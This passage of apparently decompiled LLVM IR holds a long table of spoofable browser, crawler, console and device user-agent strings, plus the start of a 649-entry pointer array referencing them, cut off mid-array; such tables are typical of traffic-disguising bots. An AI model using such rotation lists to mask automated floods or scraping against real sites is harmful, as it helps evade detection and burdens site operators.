@global_var_805b2d0.468 = constant [88 x i8] c"Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)\00"
@global_var_805b328.469 = constant [85 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13\00"
@global_var_805b380.470 = constant [64 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)\00"
@global_var_805b3c0.471 = constant [103 x i8] c"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)\00"
@global_var_805b428.472 = constant [52 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)\00"
@global_var_805b45c.473 = constant [48 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)\00"
@global_var_805b48c.474 = constant [115 x i8] c"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/25.0.1364.97 Safari/537.22 Perk/3.3.0.0\00"
@global_var_805b500.475 = constant [105 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)\00"
@global_var_805b56c.476 = constant [90 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo Firefox/3.6.8\00"
@global_var_805b5c8.477 = constant [103 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7\00"
@global_var_805b630.478 = constant [73 x i8] c"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)\00"
@global_var_805b67c.479 = constant [84 x i8] c"Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)\00"
@global_var_805b6d0.480 = constant [103 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6\00"
@global_var_805b738.481 = constant [75 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0\00"
@global_var_805b784.482 = constant [130 x i8] c"MOT-L7/08.B7.ACR MIB/2.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.1Mozilla/4.0 (Compatible; MSIE 8.0; Windows NT 5.2; Trident/6.0)\00"
@global_var_805b808.483 = constant [65 x i8] c"Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)\00"
@global_var_805b84c.484 = constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; pl) Opera 11.00\00"
@global_var_805b890.485 = constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; en) Opera 11.00\00"
@global_var_805b8d4.486 = constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; ja) Opera 11.00\00"
@global_var_805b918.487 = constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; de) Opera 11.01\00"
@global_var_805b95c.488 = constant [51 x i8] c"Gigabot/3.0 (http://www.gigablast.com/spider.html)\00"
@global_var_805b990.489 = constant [61 x i8] c"LG-BDP Linux/2.6.35 UPnP/1.0 DLNADOC/1.50 LGE_DLNA_SDK/1.5.0\00"
@global_var_805b9d0.490 = constant [127 x i8] c"Mozilla/5.0 (SmartHub; SMART-TV; U; Linux/SmartTV) AppleWebKit/531.2+ (KHTML, like Gecko) WebBrowser/1.0 SmartTV Safari/531.2+\00"
@global_var_805ba50.491 = constant [107 x i8] c"Mozilla/5.0 (SMART-TV; X11; Linux i686) AppleWebKit/535.20+ (KHTML, like Gecko) Version/5.0 Safari/535.20+\00"
@global_var_805babc.492 = constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; fr) Opera 11.00\00"
@global_var_805bb00.493 = constant [110 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36\00"
@global_var_805bb70.494 = constant [115 x i8] c"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36\00"
@global_var_805bbe4.495 = constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0\00"
@global_var_805bc30.496 = constant [135 x i8] c"Mozilla/5.0 (iPhone; CPU iPhone OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H143 Safari/600.1.4\00"
@global_var_805bcb8.497 = constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0\00"
@global_var_805bd04.498 = constant [110 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36\00"
@global_var_805bd74.499 = constant [109 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36\00"
@global_var_805bde4.500 = constant [115 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11) AppleWebKit/601.1.56 (KHTML, like Gecko) Version/9.0 Safari/601.1.56\00"
@global_var_805be58.501 = constant [117 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/601.2.7 (KHTML, like Gecko) Version/9.0.1 Safari/601.2.7\00"
@global_var_805bed0.502 = constant [69 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko\00"
@global_var_805bf18.503 = constant [120 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A\00"
@global_var_805bf90.504 = constant [111 x i8] c"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36\00"
@global_var_805c000.505 = constant [109 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.94 Safari/537.36\00"
@global_var_805c070.506 = constant [147 x i8] c"Mozilla/5.0 (Linux; Android 4.4.3; HTC_0PCV2 Build/KTU84L) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36\00"
@global_var_805c104.507 = constant [70 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; X11; Linux x86_64; pl) Opera 11.00\00"
@global_var_805c14c.508 = constant [70 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows 98; .NET CLR 3.0.04506.30)\00"
@global_var_805c194.509 = constant [123 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/4.0; GTB7.4; InfoPath.3; SV1; .NET CLR 3.4.53360; WOW64; en-US)\00"
@global_var_805c210.510 = constant [123 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 4.4.58799; WOW64; en-US)\00"
@global_var_805c28c.511 = constant [82 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:25.0) Gecko/20100101 Firefox/25.0\00"
@global_var_805c2e0.512 = constant [82 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:21.0) Gecko/20100101 Firefox/21.0\00"
@global_var_805c334.513 = constant [82 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:24.0) Gecko/20100101 Firefox/24.0\00"
@global_var_805c388.514 = constant [149 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; fr) Opera 11.00\00"
@global_var_805c420.515 = constant [181 x i8] c"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16\00"
@global_var_805c4d8.516 = constant [157 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1\00"
@global_var_805c578.517 = constant [107 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00"
@global_var_805c5e4.518 = constant [109 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11\00"
@global_var_805c654.519 = constant [118 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2\00"
@global_var_805c6cc.520 = constant [68 x i8] c"Mozilla/5.0 (Windows NT 5.1; rv:13.0) Gecko/20100101 Firefox/13.0.1\00"
@global_var_805c710.521 = constant [120 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11\00"
@global_var_805c788.522 = constant [68 x i8] c"Mozilla/5.0 (Windows NT 6.1; rv:13.0) Gecko/20100101 Firefox/13.0.1\00"
@global_var_805c7cc.523 = constant [100 x i8] c"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00"
@global_var_805c830.524 = constant [71 x i8] c"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)\00"
@global_var_805c878.525 = constant [84 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:13.0) Gecko/20100101 Firefox/13.0.1\00"
@global_var_805c8cc.526 = constant [118 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00"
@global_var_805c944.527 = constant [102 x i8] c"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11\00"
@global_var_805c9ac.528 = constant [75 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1\00"
@global_var_805c9f8.529 = constant [100 x i8] c"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00"
@global_var_805ca5c.530 = constant [102 x i8] c"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11\00"
@global_var_805cac4.531 = constant [139 x i8] c"Mozilla/5.0 (Linux; U; Android 2.2; fr-fr; Desire_A8181 Build/FRF91) App3leWebKit/53.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1\00"
@global_var_805cb50.532 = constant [84 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:13.0) Gecko/20100101 Firefox/13.0.1\00"
@global_var_805cba4.533 = constant [137 x i8] c"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3\00"
@global_var_805cc30.534 = constant [90 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.0) Opera 7.02 Bork-edition [en]\00"
@global_var_805cc8c.535 = constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:12.0) Gecko/20100101 Firefox/12.0\00"
@global_var_805ccd8.536 = constant [118 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2\00"
@global_var_805cd50.537 = constant [85 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6\00"
@global_var_805cda8.538 = constant [128 x i8] c"Mozilla/5.0 (iPad; CPU OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3\00"
@global_var_805ce28.539 = constant [106 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts; .NET CLR 1.1.4322; PeoplePal 6.2)\00"
@global_var_805ce94.540 = constant [120 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11\00"
@global_var_805cf0c.541 = constant [76 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)\00"
@global_var_805cf58.542 = constant [109 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11\00"
@global_var_805cfc8.543 = constant [68 x i8] c"Mozilla/5.0 (Windows NT 5.1; rv:5.0.1) Gecko/20100101 Firefox/5.0.1\00"
@global_var_805d00c.544 = constant [64 x i8] c"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)\00"
@global_var_805d04c.545 = constant [65 x i8] c"Mozilla/5.0 (Windows NT 6.1; rv:5.0) Gecko/20100101 Firefox/5.02\00"
@global_var_805d090.546 = constant [65 x i8] c"Opera/9.80 (Windows NT 5.1; U; en) Presto/2.10.229 Version/11.60\00"
@global_var_805d0d4.547 = constant [71 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:5.0) Gecko/20100101 Firefox/5.0\00"
@global_var_805d11c.548 = constant [128 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)\00"
@global_var_805d19c.549 = constant [83 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322)\00"
@global_var_805d1f0.550 = constant [142 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; .NET CLR 3.5.30729)\00"
@global_var_805d280.551 = constant [100 x i8] c"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1\00"
@global_var_805d2e4.552 = constant [79 x i8] c"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:13.0) Gecko/20100101 Firefox/13.0.1\00"
@global_var_805d334.553 = constant [107 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1\00"
@global_var_805d3a0.554 = constant [74 x i8] c"Mozilla/5.0 (Windows NT 6.1; rv:2.0b7pre) Gecko/20100921 Firefox/4.0b7pre\00"
@global_var_805d3ec.555 = constant [118 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00"
@global_var_805d464.556 = constant [66 x i8] c"Mozilla/5.0 (Windows NT 5.1; rv:12.0) Gecko/20100101 Firefox/12.0\00"
@global_var_805d4a8.557 = constant [51 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\00"
@global_var_805d4dc.558 = constant [66 x i8] c"Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20100101 Firefox/12.0\00"
@global_var_805d520.559 = constant [121 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; MRA 5.8 (build 4157); .NET CLR 2.0.50727; AskTbPTV/5.11.3.15590)\00"
@global_var_805d59c.560 = constant [77 x i8] c"Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:13.0) Gecko/20100101 Firefox/13.0.1\00"
@global_var_805d5ec.561 = constant [56 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\00"
@global_var_805d624.562 = constant [118 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/534.57.5 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.4\00"
@global_var_805d69c.563 = constant [68 x i8] c"Mozilla/5.0 (Windows NT 6.0; rv:13.0) Gecko/20100101 Firefox/13.0.1\00"
@global_var_805d6e0.564 = constant [63 x i8] c"Opera/9.80 (Windows NT 5.1; U; ru) Presto/2.2.15 Version/10.10\00"
@global_var_805d720.565 = constant [63 x i8] c"Opera/9.80 (Windows NT 6.1; U; ru) Presto/2.5.24 Version/10.52\00"
@global_var_805d760.566 = constant [138 x i8] c"Mozilla/5.0 (Linux; Android 6.0.1; SM-G920V Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36\00"
@global_var_805d7ec.567 = constant [42 x i8] c"Opera/8.5 (X11; i686 Linux; U; ru, en_US)\00"
@global_var_805d818.568 = constant [58 x i8] c"SexShop.Sg/Nutch-1.1 (www.SexShop.Sg; crawler@SexShop.Sg)\00"
@global_var_805d854.569 = constant [48 x i8] c"Rome Client (http://tinyurl.com/64t5n) Ver: 0.9\00"
@global_var_805d884.570 = constant [73 x i8] c"Opera/9.80 (J2ME/MIDP; Opera Mini/4.2.13918/19.752; U; ru) Presto/2.6.25\00"
@global_var_805d8d0.571 = constant [63 x i8] c"Opera/9.80 (Windows NT 6.0; U; ru) Presto/2.5.22 Version/10.50\00"
@global_var_805d910.572 = constant [80 x i8] c"Opera/9.80 (Windows NT 5.1; U; ru) Presto/2.5.24 Version/10.53 MM3-WebAssistant\00"
@global_var_805d960.573 = constant [19 x i8] c"C4PC UserAgent/0.7\00"
@global_var_805d973.574 = constant [19 x i8] c"Googlebot 1.01.003\00"
@global_var_805d988.575 = constant [75 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1\00"
@global_var_805d9d4.576 = constant [104 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3\00"
@global_var_805da3c.577 = constant [84 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:7.0.1) Gecko/20100101 Firefox/7.0.1\00"
@global_var_805da90.578 = constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:21.0) Gecko/20100101 Firefox/21.0\00"
@global_var_805dadc.579 = constant [183 x i8] c"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1\00"
@global_var_805db94.580 = constant [170 x i8] c"SAMSUNG-SGH-E250/1.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Browser/6.2.3.3.c.1.101 (GUI) MMP/2.0 (compatible; Googlebot-Mobile/2.1; +http://www.google.com/bot.html)\00"
@global_var_805dc40.581 = constant [82 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:24.0) Gecko/20100101 Firefox/24.0\00"
@global_var_805dc94.582 = constant [195 x i8] c"Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; http://www.bing.com/bingbot.htm)\00"
@global_var_805dd58.583 = constant [154 x i8] c"Mozilla/5.0 (iPad; U; CPU OS 5_1 like Mac OS X) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B367 Safari/531.21.10 UCBrowser/3.4.3.532\00"
@global_var_805ddf4.584 = constant [112 x i8] c"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1a2pre) Gecko/2008073000 Shredder/3.0a2pre ThunderBrowse/3.2.1.8\00"
@global_var_805de64.585 = constant [92 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.7.10) Gecko/20050716 Thunderbird/1.0.6\00"
@global_var_805dec0.586 = constant [81 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b7pre) Gecko/20100925 Firefox/4.0b7pre\00"
@global_var_805df14.587 = constant [117 x i8] c"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9b5pre) Gecko/2008032619 Linpus/3.0-0.49.3.0b5pre.lp Minefield/3.0b5pre\00"
@global_var_805df8c.588 = constant [91 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.3a1pre) Gecko/20100128 Minefield/3.7a1pre\00"
@global_var_805dfe8.589 = constant [97 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9a9pre) Gecko/2007100205 Minefield/3.0a9pre\00"
@global_var_805e04c.590 = constant [95 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9a4pre) Gecko/20070402 Minefield/3.0a4pre\00"
@global_var_805e0ac.591 = constant [88 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.5) Gecko/20041103 Firefox/1.0RC2\00"
@global_var_805e104.592 = constant [66 x i8] c"Mozilla/5.0 (Windows NT 6.1; rv:39.0) Gecko/20100101 Firefox/39.0\00"
@global_var_805e148.593 = constant [77 x i8] c"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:13.0) Gecko/20100101 Firefox/13.0\00"
@global_var_805e198.594 = constant [131 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101230 Mandriva Linux/1.9.2.13-0.2mdv2010.2 (2010.2) Firefox/3.6.13\00"
@global_var_805e21c.595 = constant [84 x i8] c"Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)\00"
@global_var_805e270.596 = constant [109 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.27 Safari/536.11\00"
@global_var_805e2e0.597 = constant [150 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; GTB7.3; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.1; AskTbCFTP2V5/5.14.1.20007)\00"
@global_var_805e378.598 = constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:37.0) Gecko/20100101 Firefox/37.0\00"
@global_var_805e3c4.599 = constant [126 x i8] c"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 OPR/36.0.2130.3\00"
@global_var_805e444.600 = constant [126 x i8] c"Mozilla/5.0 (Linux; U; Android 4.4.2; en-us; SCH-I535 Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile\00"
@global_var_805e4c4.601 = constant [125 x i8] c"Mozilla/5.0 (iPad; CPU OS 9_3 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13E234 Safari/601.1\00"
@global_var_805e544.602 = constant [125 x i8] c"Mozilla/5.0 (Linux; Android 5.1; XT1032 Build/LPB23.13-58) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.89 Mobile\00"
@global_var_805e5c4.603 = constant [126 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.3\00"
@global_var_805e644.604 = constant [126 x i8] c"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1; 360Spider(compatible; Ha\00"
@global_var_805e6c4.605 = constant [119 x i8] c"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36 OPR/26.0.1656.60\00"
@global_var_805e73c.606 = constant [107 x i8] c"Mozilla/5.0 (Windows NT 5.1; WOW64) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2\00"
@global_var_805e7a8.607 = constant [116 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/536.8+ (KHTML, like Gecko) Version/5.1.5 Safari/534.55.3\00"
@global_var_805e81c.608 = constant [127 x i8] c"Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25\00"
@global_var_805e89c.609 = constant [59 x i8] c"Mozilla/5.0 (compatible; Ezooms/1.0; ezooms.bot@gmail.com)\00"
@global_var_805e8d8.610 = constant [72 x i8] c"Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)\00"
@global_var_805e920.611 = constant [68 x i8] c"Mozilla/5.0 (Admin Catalog; Windows NT 5.1; infobot.4942@yahoo.com)\00"
@global_var_805e964.612 = constant [208 x i8] c"HuaweiSymantecSpider/1.0+DSE-support@huaweisymantec.com+(compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR ; http://www.huaweisymantec.com/en/IRL/spider)\00"
@global_var_805ea34.613 = constant [91 x i8] c"Mozilla/5.0 (compatible; 008/0.83; http://www.80legs.com/webcrawler.html) Gecko/2008032620\00"
@global_var_805ea90.614 = constant [106 x i8] c"Feedfetcher-Google; (+http://www.google.com/feedfetcher.html; 1 subscribers; feed-id=9422214874901413839)\00"
@global_var_805eafc.615 = constant [72 x i8] c"Mozilla/5.0 (PlayStation 4 1.52) AppleWebKit/536.26 (KHTML, like Gecko)\00"
@global_var_805eb44.616 = constant [134 x i8] c"Mozilla/5.0 (Linux; Android 4.2.2; AFTB Build/JDQ39) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/25.0.1364.173 Mobile Safari/537.22\00"
@global_var_805ebcc.617 = constant [74 x i8] c"Mozilla/5.0 (PLAYSTATION 3 4.66) AppleWebKit/531.22.8 (KHTML, like Gecko)\00"
@global_var_805ec16.618 = constant [22 x i8] c"Wget/1.12 (linux-gnu)\00"
@global_var_805ec2c.619 = constant [115 x i8] c"Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36\00"
@global_var_805eca0.620 = constant [115 x i8] c"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36\00"
@global_var_805ed14.621 = constant [112 x i8] c"Mozilla/5.0 (Nintendo WiiU) AppleWebKit/536.30 (KHTML, like Gecko) NX/3.0.4.2.12 NintendoBrowser/4.3.1.11264.US\00"
@global_var_805eda0.622 = constant [649 x i8*] [i8* getelementptr inbounds ([62 x i8], [62 x i8]* @global_var_80583cc.320, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @global_var_805840c.321, i32 0, i32 0), i8* getelementptr inbounds ([144 x i8], [144 x i8]* @global_var_805844c.322, i32 0, i32 0), i8* getelementptr inbounds ([55 x i8], [55 x i8]* @global_var_80584dc.323, i32 0, i32 0), i8* getelementptr inbounds ([32 x i8], [32 x i8]* @global_var_8058514.324, i32 0, i32 0), i8* getelementptr inbounds ([24 x i8], [24 x i8]* @global_var_8058534.325, i32 0, i32 0), i8* getelementptr inbounds ([86 x i8], [86 x i8]* @global_var_805854c.326, i32 0, i32 0), i8* getelementptr inbounds ([157 x i8], [157 x i8]* @global_var_80585a4.327, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @global_var_8058644.328, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @global_var_8058698.329, i32 0, i32 0), i8* getelementptr inbounds ([63 x i8], [63 x i8]* @global_var_805870c.330, i32 0, i32 0), i8* getelementptr inbounds ([182 x i8], [182 x i8]* @global_var_805874c.331, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @global_var_8058804.332, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @global_var_8058858.333, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @global_var_80588b0.334, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @global_var_8058908.335, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @global_var_8058948.336, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @global_var_8058990.337, i32 0, i32 0), 